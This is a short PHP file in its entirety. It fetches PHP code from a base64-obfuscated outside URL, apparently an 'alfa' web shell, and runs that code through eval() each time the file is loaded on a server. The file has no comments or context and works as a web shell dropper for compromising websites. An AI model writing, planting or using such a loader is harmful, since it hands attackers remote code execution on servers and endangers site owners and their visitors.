
<?pHp
   function get($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);

    $data = curl_exec($ch);
    curl_close($ch);

    return $data;
}
$x= '?>';
      eval($x . get(base64_decode("aHR0cHM6Ly9yb290bG9jYWxob3N0Lm5ldC9yYXcvYWxmYS1sb25n")));
?>